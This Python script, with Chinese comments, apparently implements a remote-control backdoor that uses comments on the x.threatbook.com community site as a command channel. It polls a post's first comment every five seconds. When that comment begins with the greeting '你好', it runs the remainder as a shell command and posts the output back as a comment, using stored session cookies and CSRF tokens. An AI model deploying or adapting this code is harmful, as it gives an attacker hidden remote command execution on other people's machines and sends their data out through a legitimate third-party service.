from subprocess import Popen, PIPE
import requests
import time
import json

def command(cmd):
    # Popen()函数使用shell执行命令，stdout和stderr是子进程的标准输出和标准错误输出
    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
    # 启动并等待子进程完成，通过stdout和stderr读取子进程的输出
    stdout, stderr = process.communicate()
    # 返回标准输出并解码为gbk编码的字符串
    return stdout.decode('gbk')


def get_comments(short_message_id):
    base_url = "https://x.threatbook.com/v5/node/user/article/queryComments?shortThreatId="+short_message_id
    try:
    	#模拟用户发包
        response = requests.get(base_url)
        # 直接使用 response.json() 获取对象
        json_object = response.json()
        # 定义一个评论列表
        comments_list = json_object["data"]["list"]
        # 提取第一个 comments 对应的值
        first_comment = comments_list[0]["comments"]
        first_comment1 = first_comment[3:]
        # 返回第一个 comments 对应的值
        return first_comment,first_comment1
        # 错误性判断
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")


def send_comment(comment, short_message_id, csrf_token, rememberme, xx_csrf):
    url = "https://x.threatbook.com/v5/node/user/article/saveComment"
	#请求头
    headers = {
        "Host": "x.threatbook.com",
        "Cookie": f"csrfToken={csrf_token}; rememberme={rememberme}; xx-csrf={xx_csrf}",
        "Content-Type": "application/json",
        "X-Csrf-Token": csrf_token,
        "Xx-Csrf": xx_csrf,
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
	#请求体
    data = {
        "comment": comment,
        "isAnonymous": "False",
        "targetId": "0",
        "shortMeaasgeId": short_message_id
    }
	#回显命令
    try:
        response = requests.post(url, json=data, headers=headers)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    # 打开 JSON 文件并读取内容
    with open('data.json', 'r') as f:
        json_str = f.read()

    # 解析 JSON 数据
    data = json.loads(json_str)

    # 读取各个字段的值
    short_message_id = data['short_message_id']
    csrfToken = data['csrfToken']
    rememberme = data['rememberme']
    xx_csrf = data['xx_csrf']

    while True:
        cmd = get_comments(short_message_id)[0]
        if cmd.startswith("你好"):
            # 如果以 "你好" 开头，则执行下一步操作
            send_comment(command(get_comments(short_message_id)[1]), short_message_id, csrfToken, rememberme, xx_csrf)
            print("执行成功")
        else:
            # 如果不以 "你好" 开头，则执行其他操作
            print("命令错误")
        time.sleep(5)  # 延时5秒


